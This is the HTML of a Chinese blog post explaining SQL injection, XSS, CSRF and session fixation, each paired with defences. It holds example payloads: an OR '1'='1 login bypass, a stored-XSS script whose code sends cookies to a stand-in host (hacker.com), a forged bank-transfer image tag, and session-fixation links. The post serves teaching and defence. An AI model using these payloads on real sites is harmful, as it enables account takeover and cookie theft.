@@ -1,0 +1,822 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="WEB," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="在WEB应用中，我们会遇到各种各样的安全问题，本文讲解了几种最常见几种安全问题。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见 WEB 安全问题">
+<meta property="og:url" content="http://korben-chy.github.io/2017/05/25/常见-WEB-安全问题/index.html">
+<meta property="og:site_name" content="Korben C .">
+<meta property="og:description" content="在WEB应用中，我们会遇到各种各样的安全问题，本文讲解了几种最常见几种安全问题。">
+<meta property="og:updated_time" content="2017-05-25T02:56:09.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="常见 WEB 安全问题">
+<meta name="twitter:description" content="在WEB应用中，我们会遇到各种各样的安全问题，本文讲解了几种最常见几种安全问题。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"hide","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://korben-chy.github.io/2017/05/25/常见-WEB-安全问题/"/>
+
+
+
+
+
+  <title> 常见 WEB 安全问题 | Korben C . </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?248a1a42adfa894d9423899a4664ebb1";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Korben C .</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">One Fall in Love with W.  Bai</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://korben-chy.github.io/2017/05/25/常见-WEB-安全问题/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Korben C .">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Korben C .">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                常见 WEB 安全问题
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-25T10:56:09+08:00">
+                2017-05-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a class="cloud-tie-join-count" href="/2017/05/25/常见-WEB-安全问题/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count join-count" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在<code>WEB</code>应用中，我们会遇到各种各样的安全问题，本文讲解了几种最常见几种安全问题。<br><a id="more"></a></p>
+<h1 id="1、-SQL-注入"><a href="#1、-SQL-注入" class="headerlink" title="1、 SQL 注入"></a>1、 SQL 注入</h1><p><code>SQL</code>攻击（SQL injection），简称注入攻击，是发生于应用程序之数据库层的安全漏洞。</p>
+<p>什么是<code>SQL</code>注入攻击？我们看下面的例子，加入某网站的登录验证<code>SQL</code>为：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strSQL = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> (<span class="keyword">name</span> = <span class="string">'" + userName + "'</span>) <span class="keyword">and</span> (pw = <span class="string">'"+ passWord +"'</span>);"</div></pre></td></tr></table></figure></p>
+<p>然后黑客恶意填入：<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">userName</span> = <span class="string">"1' OR '1'='1"</span><span class="comment">;</span></div><div class="line"><span class="attribute">passWord</span> = <span class="string">"1' OR '1'='1"</span><span class="comment">;</span></div></pre></td></tr></table></figure></p>
+<p>也就是实际上运行的SQL命令会变成下面这样的：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strSQL = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> (<span class="keyword">name</span> = <span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span>=<span class="string">'1'</span>) <span class="keyword">and</span> (pw = <span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span>=<span class="string">'1'</span>);"</div></pre></td></tr></table></figure></p>
+<p>也就是实际上运行的SQL命令会变成下面这样的：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strSQL = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span>;"</div></pre></td></tr></table></figure></p>
+<p>因此达到无账号密码，亦可登录网站。所以SQL注入攻击被俗称为黑客的填空游戏。</p>
+<h2 id="1-1、怎样防范-SQL-注入？"><a href="#1-1、怎样防范-SQL-注入？" class="headerlink" title="1.1、怎样防范 SQL 注入？"></a>1.1、怎样防范 SQL 注入？</h2><ul>
+<li>网络世界是不能信任的！！！</li>
+<li>永远不能相信用户的输入， 一定要做校验，过滤非法字符</li>
+<li>完全使用参数化查询（Parameterized Query）来设计数据访问功能；</li>
+</ul>
+<h1 id="2、XSS（跨站脚本攻击）"><a href="#2、XSS（跨站脚本攻击）" class="headerlink" title="2、XSS（跨站脚本攻击）"></a>2、XSS（跨站脚本攻击）</h1><p>跨站脚本（Cross-site scripting，通常简称为：XSS）是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。</p>
+<h2 id="2-1、常用的-XSS-攻击手段和目的"><a href="#2-1、常用的-XSS-攻击手段和目的" class="headerlink" title="2.1、常用的 XSS 攻击手段和目的"></a>2.1、常用的 XSS 攻击手段和目的</h2><ul>
+<li>盗用cookie，获取敏感信息。</li>
+<li>利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。</li>
+<li>利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</li>
+<li>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li>
+<li>在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。</li>
+</ul>
+<h2 id="2-2、XSS-的分类"><a href="#2-2、XSS-的分类" class="headerlink" title="2.2、XSS 的分类"></a>2.2、XSS 的分类</h2><ul>
+<li>持久性XSS<blockquote>
+<p>主要出现在让用户输入数据，供其他浏览此页的用户进行查看的地方，包括留言、评论、博客日志和各类表单等。应用程序从数据库中查询数据，在页面中显示出来，攻击者在相关页面输入恶意的脚本数据后，用户浏览此类页面时就可能受到攻击。这个流程简单可以描述为:恶意用户的Html输入Web程序-&gt;进入数据库-&gt;Web程序-&gt;用户浏览器。</p>
+</blockquote>
+</li>
+<li>反射性XSS<blockquote>
+<p>主要做法是将脚本代码加入URL地址的请求参数里，请求参数进入程序后在页面直接输出，用户点击类似的恶意链接就可能受到攻击。</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="2-3、XSS-举例"><a href="#2-3、XSS-举例" class="headerlink" title="2.3、XSS 举例"></a>2.3、XSS 举例</h2><p>下面我们来看一个XSS攻击的例子：</p>
+<ol>
+<li><p>黑客登录某一站点，并在评论框中加入了一段script代码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">文章不错哦，顶一个！</div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type-</span>"<span class="attr">text</span>/<span class="attr">javascript</span>" <span class="attr">src</span>=<span class="string">"http://hacker.com/hack.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
+<p> 这样，这一段代码就进入了网站对应的数据库中。</p>
+</li>
+<li><p>hack.js 的内容如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</div><div class="line">img.src = <span class="string">"http://hacker.com/log?"</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</div><div class="line"><span class="built_in">document</span>.body.appendChild(img);</div></pre></td></tr></table></figure>
+</li>
+<li><p>每一个访问到相关评论页面的人，都会加载”hack.js”。</p>
+</li>
+<li>hack.js<br>被加载后，本地的cookie就会被黑客获取！然后黑客就可以冒充你的身份做事情了。</li>
+</ol>
+<h2 id="2-4、防范-XSS"><a href="#2-4、防范-XSS" class="headerlink" title="2.4、防范 XSS"></a>2.4、防范 XSS</h2><ol>
+<li>永远不能相信用户的输入，一定要做校验，过滤非法字符，例如”&lt; &gt;”等。</li>
+<li>对字符进行转义。</li>
+<li>给cookie 加上HttpOnly, 防止被javascript 访问到。</li>
+</ol>
+<h1 id="3、CSRF（跨站请求伪造）"><a href="#3、CSRF（跨站请求伪造）" class="headerlink" title="3、CSRF（跨站请求伪造）"></a>3、CSRF（跨站请求伪造）</h1><p>跨站请求伪造（Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF，是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p>
+<h2 id="3-1、CSRF-举例"><a href="#3-1、CSRF-举例" class="headerlink" title="3.1、CSRF 举例"></a>3.1、CSRF 举例</h2><p>假如一家银行用以执行转账操作的URL地址如下：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.examplebank.com/withdraw</span>?account=AccoutName&amp;amount=<span class="number">1000</span>&amp;<span class="keyword">for</span>=PayeeName</div></pre></td></tr></table></figure></p>
+<p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="params">&lt;img src="http://www.examplebank.com/withdraw?account=Alice<span class="variable">&amp;amount</span>=<span class="number">1000</span><span class="variable">&amp;for</span>=Badman"&gt;</span></div></pre></td></tr></table></figure></p>
+<p>如果有账户名为Alice的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失1000资金。<br>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。<br>透过例子能够看出，攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
+<h2 id="3-2、防范-CSRF"><a href="#3-2、防范-CSRF" class="headerlink" title="3.2、防范 CSRF"></a>3.2、防范 CSRF</h2><ol>
+<li><p>检查Referer字段<br>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以上文银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于www.examplebank.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于www.examplebank.com之下，这时候服务器就能识别出恶意的访问。</p>
+<p> 这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。</p>
+</li>
+<li><p>添加校验token<br>由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验token的值为空或者错误，拒绝这个可疑请求。</p>
+</li>
+</ol>
+<h1 id="4、Session-Fixation"><a href="#4、Session-Fixation" class="headerlink" title="4、Session Fixation"></a>4、Session Fixation</h1><p>Session Fixation 攻击也是一种常见的可以应用于WEB 的攻击。</p>
+<p>一些网站在登录后会返回给用户一个<code>SessioniID</code>来标明用户的身份，当黑客拿到这个ID后，就相当于拿到了用户的身份，进而可以执行相关的操作。</p>
+<p>下面我们通过维基百科给出的相关栗子来具体了解Session Fixation.</p>
+<h2 id="4-1、攻击场景1：服务器接收任意的SessionID"><a href="#4-1、攻击场景1：服务器接收任意的SessionID" class="headerlink" title="4.1、攻击场景1：服务器接收任意的SessionID"></a>4.1、攻击场景1：服务器接收任意的SessionID</h2><ol>
+<li>Mallory 发现<code>http://unsafe.example.com/</code>可以接收任意的SessionID，并且SessionID是以请求参数的方式提交到服务器的，同时服务器没有对SessionID的安全校验，也就是说<code>http://unsafe.example.com/</code>是不安全的。</li>
+<li>于是Mallory 给 Alice 发送了一封邮件：”Hey, check this out, there is a cool new account summary feature on our bank, <a href="http://unsafe.example.com/?SID=I_WILL_KNOW_THE_SID&quot;。Mallory" target="_blank" rel="external">http://unsafe.example.com/?SID=I_WILL_KNOW_THE_SID&quot;。Mallory</a> 正在试图将SessionID 固定为”I_WILL_KNOW_THE_SID”。</li>
+<li>Alice 对这个网站很感兴趣，并登陆了自己的账号。</li>
+<li>由于Alice 已经登陆账号并把SID：”I_WILL_KNOW_THE_SID”提交至服务器，因此这个SID 就是 Alice 身份的标识了。</li>
+<li>Mallory 就可以使用SID：”I_WILL_KNOW_THE_SID”来无限制的访问 Alice 的账号了。</li>
+</ol>
+<h2 id="4-2、攻击场景2：服务器只接收服务器产生的SessionID"><a href="#4-2、攻击场景2：服务器只接收服务器产生的SessionID" class="headerlink" title="4.2、攻击场景2：服务器只接收服务器产生的SessionID"></a>4.2、攻击场景2：服务器只接收服务器产生的SessionID</h2><ol>
+<li>Mallory 访问<code>http://vulneralbe.example.com/</code> 并登陆后，获得SessionID:“0D6441FEA4496C2”。</li>
+<li>于是 Mallory 又给 Alice 发送了一封邮件：”Check out this new cool feature on<br>130 our bank, <a href="http://vulnerable.example.com/?SID=0D6441FEA4496C2.&quot;，邮件中包含了刚刚获得的SID。" target="_blank" rel="external">http://vulnerable.example.com/?SID=0D6441FEA4496C2.&quot;，邮件中包含了刚刚获得的SID。</a></li>
+<li>Alice 使用SessionID: “0D6441FEA4496C2”登陆了。</li>
+<li>Mallory 就可以使用SID：”0D6441FEA4496C2”来无限制的访问 Alice 的账号了。</li>
+</ol>
+<h2 id="4-3、攻击场景3：服务器接收跨子域名的Cookie"><a href="#4-3、攻击场景3：服务器接收跨子域名的Cookie" class="headerlink" title="4.3、攻击场景3：服务器接收跨子域名的Cookie"></a>4.3、攻击场景3：服务器接收跨子域名的Cookie</h2><ol>
+<li>网站<code>www.example.com</code>将子域名移交给不可信的第三方。</li>
+<li>Mallory 控制了其中的一个子域名：<code>evil.example.com</code>，然后诱导Alice 访问了这个网站。</li>
+<li>在Alice 访问这个网站后，以域名为”.example.com”的cookie就存在了 Alice 的浏览器中。</li>
+<li>当 Alice 访问网站<code>www.example.com</code>时，前面产生的cookie会被发送到服务器，这样 Alice 就拥有了基于 Mallory 的cookie 而生成的Session。</li>
+<li>如果Alice 登录了，Mallory 就可以无限制的访问 Alice 的账户了。</li>
+</ol>
+<h1 id="4-4、防范-Session-Fixation"><a href="#4-4、防范-Session-Fixation" class="headerlink" title="4.4、防范 Session Fixation"></a>4.4、防范 Session Fixation</h1><ol>
+<li>不要接收来自Get/Post请求中的身份识别信息；</li>
+<li>每次请求都产生新的SessionID；</li>
+<li>只接收服务器产生的SessionID；</li>
+<li>为SessionID设置过期时间；</li>
+<li>如果Referrer可以，立即销毁SessionID；</li>
+<li>验证其他信息在整个会话中是否一致。</li>
+</ol>
+<hr>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A" target="_blank" rel="external">SQL注入攻击</a><br><a href="https://en.wikipedia.org/wiki/Session_fixation" target="_blank" rel="external">Session fixation</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WEB/" rel="tag"># WEB</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/05/23/Java-HashMap-源代码解析/" rel="next" title="Java HashMap 源代码解析">
+                <i class="fa fa-chevron-left"></i> Java HashMap 源代码解析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/05/25/CopyOnWriteArrayList-解析/" rel="prev" title="CopyOnWriteArrayList 解析">
+                CopyOnWriteArrayList 解析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+          
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="Korben C ." />
+          <p class="site-author-name" itemprop="name">Korben C .</p>
+           
+              <p class="site-description motion-element" itemprop="description">On The Way</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">25</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1、-SQL-注入"><span class="nav-number">1.</span> <span class="nav-text">1、 SQL 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1、怎样防范-SQL-注入？"><span class="nav-number">1.1.</span> <span class="nav-text">1.1、怎样防范 SQL 注入？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2、XSS（跨站脚本攻击）"><span class="nav-number">2.</span> <span class="nav-text">2、XSS（跨站脚本攻击）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1、常用的-XSS-攻击手段和目的"><span class="nav-number">2.1.</span> <span class="nav-text">2.1、常用的 XSS 攻击手段和目的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2、XSS-的分类"><span class="nav-number">2.2.</span> <span class="nav-text">2.2、XSS 的分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3、XSS-举例"><span class="nav-number">2.3.</span> <span class="nav-text">2.3、XSS 举例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-4、防范-XSS"><span class="nav-number">2.4.</span> <span class="nav-text">2.4、防范 XSS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3、CSRF（跨站请求伪造）"><span class="nav-number">3.</span> <span class="nav-text">3、CSRF（跨站请求伪造）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1、CSRF-举例"><span class="nav-number">3.1.</span> <span class="nav-text">3.1、CSRF 举例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2、防范-CSRF"><span class="nav-number">3.2.</span> <span class="nav-text">3.2、防范 CSRF</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4、Session-Fixation"><span class="nav-number">4.</span> <span class="nav-text">4、Session Fixation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1、攻击场景1：服务器接收任意的SessionID"><span class="nav-number">4.1.</span> <span class="nav-text">4.1、攻击场景1：服务器接收任意的SessionID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2、攻击场景2：服务器只接收服务器产生的SessionID"><span class="nav-number">4.2.</span> <span class="nav-text">4.2、攻击场景2：服务器只接收服务器产生的SessionID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-3、攻击场景3：服务器接收跨子域名的Cookie"><span class="nav-number">4.3.</span> <span class="nav-text">4.3、攻击场景3：服务器接收跨子域名的Cookie</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-4、防范-Session-Fixation"><span class="nav-number">5.</span> <span class="nav-text">4.4、防范 Session Fixation</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">6.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Korben C .</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+    
+    <script>
+      var cloudTieConfig = {
+        url: document.location.href, 
+        sourceId: "",
